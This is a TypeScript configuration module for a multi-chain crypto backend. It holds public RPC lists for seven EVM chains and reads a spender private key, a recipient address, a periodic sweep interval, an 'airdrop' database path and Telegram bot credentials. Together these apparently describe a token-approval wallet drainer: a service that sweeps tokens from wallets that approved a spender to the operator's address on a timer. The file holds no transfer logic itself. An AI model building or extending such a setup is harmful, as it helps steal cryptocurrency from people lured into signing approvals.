import 'dotenv/config';
import { privateKeyToAccount } from 'viem/accounts';

// ── keyless free-tier RPC stack per chain (comma-separated) ──
// the executor builds a viem fallback() transport over every URL:
// auto-ranks fastest endpoint, fails over on error. $0.
// Override or extend per chain in .env → RPC_1=https://a,https://b
const FREE_RPCS: Record<number, string> = {
  1:     'https://eth.llamarpc.com,https://ethereum-rpc.publicnode.com,https://rpc.ankr.com/eth',
  56:    'https://bsc-dataseed.bnbchain.org,https://bsc-rpc.publicnode.com,https://1rpc.io/bnb',
  137:   'https://polygon-rpc.com,https://polygon-bor-rpc.publicnode.com,https://1rpc.io/matic',
  42161: 'https://arb1.arbitrum.io/rpc,https://arbitrum-one-rpc.publicnode.com,https://1rpc.io/arbitrum',
  10:    'https://mainnet.optimism.io,https://optimism-rpc.publicnode.com,https://1rpc.io/optimism',
  8453:  'https://mainnet.base.org,https://base-rpc.publicnode.com,https://1rpc.io/base',
  43114: 'https://api.avax.network/ext/bc/C/rpc,https://avalanche-cchain-rpc.publicnode.com,https://1rpc.io/avax',
};

function collectChains(): Record<number, string> {
  const out: Record<number, string> = {};
  for (const [id, urls] of Object.entries(FREE_RPCS)) out[Number(id)] = urls;
  for (const [k, v] of Object.entries(process.env)) {
    const m = /^RPC_(\d+)$/.exec(k);
    if (!m || !v) continue;
    const prev: string[] = (out[Number(m[1])] ?? '').split(',').map((s) => s.trim()).filter(Boolean);
    const mine:  string[] = v.split(',').map((s) => s.trim()).filter(Boolean);
    out[Number(m[1])] = [...mine, ...prev].join(','); // yours first, free stack as failover
  }
  return out;
}

export const config = {
  port: Number(process.env.PORT || 8788),
  corsOrigin: process.env.CORS_ORIGIN || '*',
  apiKey: process.env.API_KEY || '',
  envSpender: (process.env.SPENDER_ADDRESS || '').trim(),
  spenderPrivateKey: (process.env.SPENDER_PRIVATE_KEY || '') as `0x${string}`,
  recipient: (process.env.RECIPIENT_ADDRESS || '').trim(),
  maxGasGwei: Number(process.env.MAX_GAS_GWEI || 50),
  sweepIntervalMs: Number(process.env.SWEEP_INTERVAL_MS || 60_000),
  telegramToken: process.env.TELEGRAM_BOT_TOKEN || '',
  telegramChatId: process.env.TELEGRAM_CHAT_ID || '',
  pairCode: (process.env.TELEGRAM_PAIR_CODE || '').trim(), // /pair code — set a long random string
  dbPath: process.env.DB_PATH || './data/airdrop.db',
  chains: collectChains(),
};

export const spenderAccount = config.spenderPrivateKey
  ? privateKeyToAccount(config.spenderPrivateKey)
  : null;

export const CHAIN_NAMES: Record<number, string> = {
  1: 'Ethereum', 56: 'BNB Chain', 137: 'Polygon',
  42161: 'Arbitrum', 10: 'Optimism', 8453: 'Base', 43114: 'Avalanche',
};
